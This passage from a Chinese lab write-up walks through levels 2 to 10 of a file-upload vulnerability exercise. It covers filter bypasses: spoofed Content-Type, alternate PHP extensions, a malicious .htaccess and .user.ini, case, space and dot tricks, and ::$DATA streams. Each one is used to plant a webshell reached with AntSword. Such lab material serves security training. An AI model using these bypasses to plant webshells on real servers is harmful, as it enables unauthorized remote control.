+	srcset="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D3_hu8169021143021056500.jpg 480w, /p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D3_hu9565461217047607684.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="353"
+		data-flex-basis="848px"
+	
+></p>
+<h2 id="第二关-1">第二关
+</h2><p>源码中$_FILES[&lsquo;upload_file&rsquo;] [&rsquo;tmp_name&rsquo;]文件被上传后在服务端储存的临时文件名，一般是系统默认。</p>
+<p>而$_FILES[&lsquo;upload_file&rsquo;] [&rsquo;type&rsquo;]是文件的 MIME 类型，需要浏览器提供该信息的支持，比如&quot;image/gif&quot;。</p>
+<p>发现是查看上传文件数据包中的Content-Type，我们只需要把类型修改为image/jpeg，image/png，image/gif就可以上传成功。</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D1.jpg"
+	width="1390"
+	height="743"
+	srcset="/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D1_hu9858993740297570803.jpg 480w, /p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D1_hu17729469436555934275.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="448px"
+	
+></p>
+<p>下图是数据包</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D2.jpg"
+	width="1495"
+	height="838"
+	srcset="/p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D2_hu9621868372680107397.jpg 480w, /p/task1/%E7%AC%AC%E4%BA%8C%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D2_hu4480627298698340651.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="428px"
+	
+></p>
+<h2 id="第三关">第三关
+</h2><p>查看源代码，发现是黑名单，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="o">//</span><span class="err">存在提交文件进入</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="n">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span><span class="o">//</span><span class="err">存在上传的路径进入</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">deny_ext</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="s1">&#39;.asp&#39;</span><span class="p">,</span><span class="s1">&#39;.aspx&#39;</span><span class="p">,</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="s1">&#39;.jsp&#39;</span><span class="p">);</span><span class="o">//</span><span class="err">定义一个黑名单数组</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">file_name</span> <span class="o">=</span> <span class="n">trim</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">file_name</span> <span class="o">=</span> <span class="n">deldot</span><span class="p">(</span><span class="o">$</span><span class="n">file_name</span><span class="p">);</span><span class="o">//</span><span class="err">删除文件名末尾的点</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">file_ext</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="o">$</span><span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">file_ext</span> <span class="o">=</span> <span class="n">strtolower</span><span class="p">(</span><span class="o">$</span><span class="n">file_ext</span><span class="p">);</span> <span class="o">//</span><span class="err">转换为小写</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">file_ext</span> <span class="o">=</span> <span class="n">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="o">$</span><span class="n">file_ext</span><span class="p">);</span><span class="o">//</span><span class="err">去除字符串</span><span class="p">::</span><span class="o">$</span><span class="n">DATA</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">file_ext</span> <span class="o">=</span> <span class="n">trim</span><span class="p">(</span><span class="o">$</span><span class="n">file_ext</span><span class="p">);</span> <span class="o">//</span><span class="err">收尾去空</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>trim函数，由于后面没有跟规定从字符串中删除哪些字符，则移除以下所有字符：</p>
+<ul>
+<li>&ldquo;\0&rdquo; - NULL</li>
+<li>&ldquo;\t&rdquo; - 制表符</li>
+<li>&ldquo;\n&rdquo; - 换行</li>
+<li>&ldquo;\x0B&rdquo; - 垂直制表符</li>
+<li>&ldquo;\r&rdquo; - 回车</li>
+<li>&quot; &quot; - 空格</li>
+</ul>
+<p>$_FILES[&lsquo;upload_file&rsquo;] [&rsquo;name&rsquo;]中传入的是客户端的原文件名字</p>
+<p>但是由于它没有屏蔽.php5 .php3 .phtml这种后缀，所以我们可以进行绕过，直接修改php后缀为.php5上传用蚁剑连接。</p>
+<p>但是注意此关要用phpstudy 2018进行，并且在apache服务器的配置文件httpd-conf中将</p>
+<p>AddType application/x-httpd-php .php 后加入.phtml .php5 .jpg这样就可以解析.php5 .phtml后缀的文件了，并且php的版本中不能带nts。</p>
+<h2 id="第四关">第四关
+</h2><p>第四关在第三关的基础上屏蔽了.php5 .php3 .phtml等文件后缀</p>
+<p>但是没有过滤.htaccess文件</p>
+<p><img src="/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%B8%80.jpg"
+	width="1566"
+	height="851"
+	srcset="/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%B8%80_hu8006654324711718045.jpg 480w, /p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%B8%80_hu6702220127819809209.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="441px"
+	
+></p>
+<p>.htaccess文件：指在特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录</p>
+<p>我们可以在.htaccess中写入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddType application/x-httpd-php .php .phtml .php5 .jpg
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这样就可以把这些文件当作php解析，再上传带有一句话木马的.jpg文件用蚁剑连接</p>
+<p><img src="/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg"
+	width="1542"
+	height="1040"
+	srcset="/p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%BA%8C_hu4796111132851221857.jpg 480w, /p/task1/%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%AC%E4%BA%8C_hu12338129446818177195.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<p>注意！！！.htaccess前不要带前缀比如1.htaccess！！</p>
+<h2 id="第五关-1">第五关
+</h2><p>第一种</p>
+<p>通过.user.ini进行绕过，进行此上传的前提有该上传目录必须要有php文件且.user,.ini得生效。</p>
+<p>并且php版本在5.的不能成功注入，在试了7.1.13版本可以注入，要查看自己的php版本是否可以使.user.ini生效可以去输入url加phpinfo.php，查看里面server api是否是CGI/FastCGI。</p>
+<p>php.ini是php的一个全局配置文件，.user.ini和.htaccess都是配置文件，.user.ini是用户自定义的一个php.ini。通过创建一个.user.ini文件在里面写入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">auto_prepend_file = 5.jpg
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>5.jpg是我们创建的一个包含一句话木马的jpg文件</p>
+<p>上传上去，打开图片链接，并且把图片名字改为readme.php用蚁剑链接这个地址就可以了。</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D.jpg"
+	width="2052"
+	height="1521"
+	srcset="/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu3169477242542636411.jpg 480w, /p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu1567906440052582812.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="134"
+		data-flex-basis="323px"
+	
+></p>
+<p>第二种</p>
+<p>注意！！这种绕过7.1.13版本不能，5.4.45可以</p>
+<p>由于它的过滤不是循环过滤，而是只过滤一次就结束，可以使用. .进行绕过</p>
+<p>这是由于Windows会帮我们把文件后面的.自动删除</p>
+<p>如果我们上传一个1.php. .文件，根据它的过滤规则，首先获取我们上传的文件名，再删除后面的.，这时我们获取的是1.php. ，再由</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span><span class="nx">；</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们获得.后面的的也就是. ，再将首尾去空我们最终得到 $file_name为1.php.</p>
+<p>$file_ext中存的值为.。由下面的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据上路径和$file_name进行拼接则可以成功绕过</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg"
+	width="1545"
+	height="1044"
+	srcset="/p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%BA%8C_hu9858319392119760028.jpg 480w, /p/task1/%E7%AC%AC%E4%BA%94%E5%85%B3%E7%AC%AC%E4%BA%8C_hu8538718243075948422.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="355px"
+	
+></p>
+<h2 id="第六关">第六关
+</h2><p>第六关很简单，也是黑名单但是没有前几关的大小写判断，所以抓包修改文件后缀为.phP 就可以绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$file_ext = strtolower($file_ext); //转换为小写
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意！！！第六关如果访问上传文件出现500错误，换成nginx服务器或者降低版本</p>
+<h2 id="第七关">第七关
+</h2><p>第七关发现没有进行空格删除</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> $file_ext = trim($file_ext); //收尾去空
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所有以抓包在文件后缀后面加入一个空格就可以绕过。</p>
+<h2 id="第八关-1">第八关
+</h2><p>这一关比前几关少了一个删除.的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$file_name = deldot($file_name);//删除文件名末尾的点
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以我们可以抓包在上传文件后缀后加一个.进行绕过。</p>
+<h2 id="第九关-1">第九关
+</h2><p>在Windows系统中，文件名后面跟一个“::$DATA“,表示文件的一个附加的数据流，大部分文件操作工具不会意识到这些数据流。</p>
+<p>我们可以上传php文件抓包在其后缀后面加入::$DATA，就可以成功被解析。</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%B8%80.jpg"
+	width="1491"
+	height="817"
+	srcset="/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%B8%80_hu17532858797620327117.jpg 480w, /p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%B8%80_hu1368130694619756820.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="437px"
+	
+></p>
+<p>在windows系统下我们上传的这个后缀的后面::$DATA会自动被删除。</p>
+<p>连接成功</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg"
+	width="1545"
+	height="1044"
+	srcset="/p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%BA%8C_hu17732477942075817712.jpg 480w, /p/task1/%E7%AC%AC%E4%B9%9D%E5%85%B3%E7%AC%AC%E4%BA%8C_hu8376879913200890441.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="355px"
+	
+></p>
+<h2 id="第十关">第十关
+</h2><p>第十关和第五关第二种方法一样</p>
+<p>第二种</p>
+<p>注意！！这种绕过7.1.13版本不能，5.4.45可以</p>
+<p>由于它的过滤不是循环过滤，而是只过滤一次就结束，可以使用. .进行绕过</p>
+<p>这是由于Windows会帮我们把文件后面的.自动删除</p>
+<p>如果我们上传一个1.php. .文件，根据它的过滤规则，首先获取我们上传的文件名，再删除后面的.，这时我们获取的是1.php. ，再由</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span><span class="nx">；</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们获得.后面的的也就是. ，再将首尾去空我们最终得到 $file_name为1.php.</p>
+<p>$file_ext中存的值为.。由下面的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据上路径和$file_name进行拼接则可以成功绕过</p>
+
 </section>
 
 
